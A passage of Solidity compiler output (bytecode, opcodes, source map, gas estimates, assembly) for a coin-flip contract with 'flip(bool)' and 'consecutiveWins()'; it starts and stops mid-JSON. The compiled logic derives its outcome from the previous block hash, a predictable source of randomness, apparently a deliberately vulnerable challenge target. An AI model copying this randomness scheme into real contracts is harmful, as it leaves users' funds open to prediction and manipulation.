							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061013b565b610089565b6040516100629190610182565b60405180910390f35b610073610120565b604051610080919061019d565b60405180910390f35b60008060014361009991906101e9565b4060001c90508060015414156100ae57600080fd5b806001819055506000600254826100c591906101b8565b90506000600182146100d85760006100db565b60015b9050841515811515141561010c576000808154809291906100fb90610233565b91905055506001935050505061011b565b60008081905550600093505050505b919050565b60005481565b600081359050610135816102da565b92915050565b60006020828403121561014d57600080fd5b600061015b84828501610126565b91505092915050565b61016d8161021d565b82525050565b61017c81610229565b82525050565b60006020820190506101976000830184610164565b92915050565b60006020820190506101b26000830184610173565b92915050565b60006101c382610229565b91506101ce83610229565b9250826101de576101dd6102ab565b5b828204905092915050565b60006101f482610229565b91506101ff83610229565b9250828210156102125761021161027c565b5b828203905092915050565b60008115159050919050565b6000819050919050565b600061023e82610229565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156102715761027061027c565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6102e38161021d565b81146102ee57600080fd5b5056fea2646970667358221220797f459a25c8fdd23db0969ced689fc0b8a6dd20a09a6d5071ac3cc0684d881d64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x13B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x182 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x19D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x1E9 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xAE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xC5 SWAP2 SWAP1 PUSH2 0x1B8 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xD8 JUMPI PUSH1 0x0 PUSH2 0xDB JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x10C JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xFB SWAP1 PUSH2 0x233 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x11B JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x135 DUP2 PUSH2 0x2DA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x14D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x15B DUP5 DUP3 DUP6 ADD PUSH2 0x126 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x16D DUP2 PUSH2 0x21D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x17C DUP2 PUSH2 0x229 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x197 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x164 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x173 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C3 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1CE DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1DE JUMPI PUSH2 0x1DD PUSH2 0x2AB JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F4 DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH2 0x1FF DUP4 PUSH2 0x229 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x212 JUMPI PUSH2 0x211 PUSH2 0x27C JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x23E DUP3 PUSH2 0x229 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH2 0x271 JUMPI PUSH2 0x270 PUSH2 0x27C JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x2E3 DUP2 PUSH2 0x21D JUMP JUMPDEST DUP2 EQ PUSH2 0x2EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH26 0x7F459A25C8FDD23DB0969CED689FC0B8A6DD20A09A6D5071AC3C 0xC0 PUSH9 0x4D881D64736F6C6343 STOP ADDMOD STOP STOP CALLER ",
							"sourceMap": "62:689:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;303:445;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;87:30;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;303:445;346:4;359:18;412:1;398:12;:15;;;;:::i;:::-;388:27;380:36;;359:57;;441:10;429:8;;:22;425:53;;;462:8;;;425:53;497:10;486:8;:21;;;;514:16;544:6;;533:10;:17;;;;:::i;:::-;514:36;;557:9;581:1;569:8;:13;:28;;592:5;569:28;;;585:4;569:28;557:40;;618:6;610:14;;:4;:14;;;606:137;;;635:15;;:17;;;;;;;;;:::i;:::-;;;;;;668:4;661:11;;;;;;;606:137;713:1;695:15;:19;;;;730:5;723:12;;;;;303:445;;;;:::o;87:30::-;;;;:::o;7:133:2:-;;88:6;75:20;66:29;;104:30;128:5;104:30;:::i;:::-;56:84;;;;:::o;146:256::-;;251:2;239:9;230:7;226:23;222:32;219:2;;;267:1;264;257:12;219:2;310:1;335:50;377:7;368:6;357:9;353:22;335:50;:::i;:::-;325:60;;281:114;209:193;;;;:::o;408:109::-;489:21;504:5;489:21;:::i;:::-;484:3;477:34;467:50;;:::o;523:118::-;610:24;628:5;610:24;:::i;:::-;605:3;598:37;588:53;;:::o;647:210::-;;772:2;761:9;757:18;749:26;;785:65;847:1;836:9;832:17;823:6;785:65;:::i;:::-;739:118;;;;:::o;863:222::-;;994:2;983:9;979:18;971:26;;1007:71;1075:1;1064:9;1060:17;1051:6;1007:71;:::i;:::-;961:124;;;;:::o;1091:185::-;;1148:20;1166:1;1148:20;:::i;:::-;1143:25;;1182:20;1200:1;1182:20;:::i;:::-;1177:25;;1221:1;1211:2;;1226:18;;:::i;:::-;1211:2;1268:1;1265;1261:9;1256:14;;1133:143;;;;:::o;1282:191::-;;1342:20;1360:1;1342:20;:::i;:::-;1337:25;;1376:20;1394:1;1376:20;:::i;:::-;1371:25;;1415:1;1412;1409:8;1406:2;;;1420:18;;:::i;:::-;1406:2;1465:1;1462;1458:9;1450:17;;1327:146;;;;:::o;1479:90::-;;1556:5;1549:13;1542:21;1531:32;;1521:48;;;:::o;1575:77::-;;1641:5;1630:16;;1620:32;;;:::o;1658:233::-;;1720:24;1738:5;1720:24;:::i;:::-;1711:33;;1766:66;1759:5;1756:77;1753:2;;;1836:18;;:::i;:::-;1753:2;1883:1;1876:5;1872:13;1865:20;;1701:190;;;:::o;1897:180::-;1945:77;1942:1;1935:88;2042:4;2039:1;2032:15;2066:4;2063:1;2056:15;2083:180;2131:77;2128:1;2121:88;2228:4;2225:1;2218:15;2252:4;2249:1;2242:15;2269:116;2339:21;2354:5;2339:21;:::i;:::-;2332:5;2329:32;2319:2;;2375:1;2372;2365:12;2319:2;2309:76;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "161400",
								"executionCost": "25228",
								"totalCost": "186628"
							},
							"external": {
								"consecutiveWins()": "1129",
								"flip(bool)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 62,
									"end": 751,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 62,
									"end": 751,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 62,
									"end": 751,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 160,
									"end": 237,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 143,
									"end": 237,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 143,
									"end": 237,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 244,
									"end": 297,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 244,
									"end": 297,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 244,
									"end": 297,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 244,
									"end": 297,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 244,
									"end": 297,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 244,
									"end": 297,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 244,
									"end": 297,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 244,
									"end": 297,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 244,
									"end": 297,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 244,
									"end": 297,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 244,
									"end": 297,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 272,
									"end": 287,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 272,
									"end": 291,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 272,
									"end": 291,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 272,
									"end": 291,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 272,
									"end": 291,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 62,
									"end": 751,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 62,
									"end": 751,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 62,
									"end": 751,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 62,
									"end": 751,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 62,
									"end": 751,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 62,
									"end": 751,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 62,
									"end": 751,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220797f459a25c8fdd23db0969ced689fc0b8a6dd20a09a6d5071ac3cc0684d881d64736f6c63430008000033",
									".code": [
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH",
											"source": 0,
											"value": "E6F334D7"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 62,
											"end": 751,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 62,
											"end": 751,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 346,
											"end": 350,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 359,
											"end": 377,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 412,
											"end": 413,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 398,
											"end": 410,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 398,
											"end": 413,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 398,
											"end": 413,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 398,
											"end": 413,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 398,
											"end": 413,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 398,
											"end": 413,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 398,
											"end": 413,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 398,
											"end": 413,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 388,
											"end": 415,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 380,
											"end": 416,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 380,
											"end": 416,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 359,
											"end": 416,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 359,
											"end": 416,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 441,
											"end": 451,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 429,
											"end": 437,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 429,
											"end": 437,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 429,
											"end": 451,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 425,
											"end": 478,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 425,
											"end": 478,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 425,
											"end": 478,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 462,
											"end": 470,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 462,
											"end": 470,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 462,
											"end": 470,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 425,
											"end": 478,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 425,
											"end": 478,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 497,
											"end": 507,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 494,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 486,
											"end": 507,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 486,
											"end": 507,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 486,
											"end": 507,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 486,
											"end": 507,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 514,
											"end": 530,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 544,
											"end": 550,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 544,
											"end": 550,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 533,
											"end": 543,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 533,
											"end": 550,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 533,
											"end": 550,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 533,
											"end": 550,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 533,
											"end": 550,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 533,
											"end": 550,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 533,
											"end": 550,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 533,
											"end": 550,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 514,
											"end": 550,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 514,
											"end": 550,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 557,
											"end": 566,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 581,
											"end": 582,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 569,
											"end": 577,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 569,
											"end": 582,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 569,
											"end": 597,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 569,
											"end": 597,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 592,
											"end": 597,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 569,
											"end": 597,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 569,
											"end": 597,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 569,
											"end": 597,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 569,
											"end": 597,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 585,
											"end": 589,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 569,
											"end": 597,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 569,
											"end": 597,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 557,
											"end": 597,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 557,
											"end": 597,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 618,
											"end": 624,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 610,
											"end": 624,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 610,
											"end": 624,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 610,
											"end": 614,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 610,
											"end": 624,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 610,
											"end": 624,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 610,
											"end": 624,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 606,
											"end": 743,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 606,
											"end": 743,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 606,
											"end": 743,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 635,
											"end": 650,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 635,
											"end": 650,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "SLOAD",
